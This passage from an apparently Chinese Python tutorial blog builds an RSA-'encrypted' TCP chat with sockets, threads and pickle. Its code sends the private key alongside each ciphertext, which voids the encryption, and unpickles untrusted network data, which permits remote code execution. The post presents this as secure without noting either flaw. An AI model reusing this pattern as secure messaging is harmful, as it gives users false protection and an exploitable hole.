882321]</span></span></span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>数据加密方式：RSA加解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;data = <span class="string">'hello'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> rsa</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(PubKey,PrivateKey) = rsa.newkeys(<span class="number">512</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>encryptdata = rsa.encrypt(data.encode(),PubKey)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>encryptdata</span><br><span class="line"><span class="string">b'=\\\x1c\x93]^(Z/\xac\x81\xfd\xffj!\x0b:r\xb0\x1b\xf9\x97VZ\xdf\xe1\x9e2\xb4\x05G4\x01\x9f\xc8\xfd\x1e\x00\xa1\xb7\xbdU\x98\xbc\x1e5\xa1yy\xee$\xcd\xf8\x10\xf4\xba\t\x84\xba\x13\x99hs\x8d'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>decryptdata = rsa.decrypt(encryptdata,PrivateKey)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>decryptdata</span><br><span class="line"><span class="string">b'hello'</span></span><br></pre></td></tr></table></figure></li><li><p>题目图解</p></li></ul><p><img src="python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/rsa%E5%8A%A0%E5%AF%86.png" alt=""></p></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line">PORT = <span class="number">4396</span></span><br><span class="line">BUFF = <span class="number">1024</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RsaEncrypt</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="comment"># 利用rsa产生公钥、私钥</span></span><br><span class="line">    (PubKey, PrivateKey) = rsa.newkeys(<span class="number">512</span>)</span><br><span class="line">    content = str.encode(<span class="string">'utf8'</span>)</span><br><span class="line">    <span class="comment"># 使用公钥加密</span></span><br><span class="line">    Encrypt_Str = rsa.encrypt(content, PubKey)</span><br><span class="line">    <span class="comment"># 返回加密信息和私钥</span></span><br><span class="line">    <span class="keyword">return</span> (Encrypt_Str, PrivateKey)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RsaDecrypt</span><span class="params">(str, pk)</span>:</span></span><br><span class="line">    Decrypt_Str = rsa.decrypt(str, pk)</span><br><span class="line">    Decrypt_Str_1 = Decrypt_Str.decode(<span class="string">'utf8'</span>)</span><br><span class="line">    <span class="keyword">return</span> Decrypt_Str_1</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SendMessage</span><span class="params">(Sock, test)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        SendData = input()</span><br><span class="line">        <span class="comment"># 加密要发送的数据</span></span><br><span class="line">        (encryptdata, PrivateKey) = RsaEncrypt(SendData)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 打印加密后的数据</span></span><br><span class="line">        print(<span class="string">'encrypted data is '</span> + str(encryptdata))</span><br><span class="line">       </span><br><span class="line">        <span class="comment"># pickel封装加密后的数据和私钥</span></span><br><span class="line">        Message = pickle.dumps([encryptdata, PrivateKey])</span><br><span class="line">        <span class="keyword">if</span> len(SendData) &gt; <span class="number">0</span>:</span><br><span class="line">            Sock.send(Message)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RecvMessage</span><span class="params">(Sock, test)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 接收数据</span></span><br><span class="line">        Message = Sock.recv(BUFF)</span><br><span class="line">        <span class="comment"># pickle解封数据</span></span><br><span class="line">        (recvdata, PrivateKey) = pickle.loads(Message)</span><br><span class="line">        <span class="comment"># 对加密的数据解密</span></span><br><span class="line">        decryptdata = RsaDecrypt(recvdata, PrivateKey)</span><br><span class="line">        <span class="keyword">if</span> len(Message)&gt;<span class="number">0</span>:</span><br><span class="line">            print(<span class="string">"receive message:"</span> + decryptdata)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    type = input(<span class="string">'please input server or client:'</span>)</span><br><span class="line">    <span class="keyword">if</span> type == <span class="string">'server'</span>:</span><br><span class="line">        <span class="comment"># 创建套接字</span></span><br><span class="line">        ServerSock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        <span class="comment"># 端口绑定</span></span><br><span class="line">        ServerSock.bind((<span class="string">'127.0.0.1'</span>,PORT))</span><br><span class="line"><span class="comment"># 服务器允许连接的个数</span></span><br><span class="line">        ServerSock.listen(<span class="number">5</span>)</span><br><span class="line">        print(<span class="string">"listening......"</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            ConSock,addr = ServerSock.accept()</span><br><span class="line">            print(<span class="string">'connection succeed'</span> + <span class="string">'\n'</span> + <span class="string">'you can chat online'</span>)</span><br><span class="line">            <span class="comment"># 多线程运用</span></span><br><span class="line">            thread_1 = threading.Thread(target = SendMessage, args = (ConSock, <span class="literal">None</span>))</span><br><span class="line">            thread_2 = threading.Thread(target = RecvMessage, args = (ConSock, <span class="literal">None</span>))</span><br><span class="line">            thread_1.start()</span><br><span class="line">            thread_2.start()</span><br><span class="line">    <span class="keyword">elif</span> type == <span class="string">'client'</span>:</span><br><span class="line">        ClientSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        ServerAddr = input(<span class="string">"please input the server's ip address:"</span>)</span><br><span class="line">        ClientSock.connect((ServerAddr, PORT))</span><br><span class="line">        print(<span class="string">'connection succeed, chat start!'</span>)</span><br><span class="line">        thread_3 = threading.Thread(target = SendMessage, args = (ClientSock, <span class="literal">None</span>))</span><br><span class="line">        thread_4 = threading.Thread(target = RecvMessage, args = (ClientSock, <span class="literal">None</span>))</span><br><span class="line">        thread_3.start()</span><br><span class="line">        thread_4.start()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li><li><p>结果演示</p><ul><li><p>先启动server进行监听</p><p><img src="https://cdn.jsdelivr.net/gh/YuHaoLoveByCats/ImgHosting/Images/A03/serverlisten.png" alt=""></p></li><li><p>启动客户端连接server</p><p><img src="https://cdn.jsdelivr.net/gh/YuHaoLoveByCats/ImgHosting/Images/A03/client.png" alt=""></p></li><li><p>客户端向服务器发送消息</p><p><img src="https://cdn.jsdelivr.net/gh/YuHaoLoveByCats/ImgHosting/Images/A03/clientsend.png" alt=""></p></li><li><p>服务器端接收到消息，并将消息打印在屏幕上</p><p><img src="https://cdn.jsdelivr.net/gh/YuHaoLoveByCats/ImgHosting/Images/A03/serversend.png" alt=""></p></li></ul></li><li><p>分析</p><p>综上，该程序利用的是TCP套接字保证了传输的可靠性，并利用多线程进行信息交互，pickle封装数据，rsa产生公钥、私钥、和加/解密等操作</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> python网络编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python网络编程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
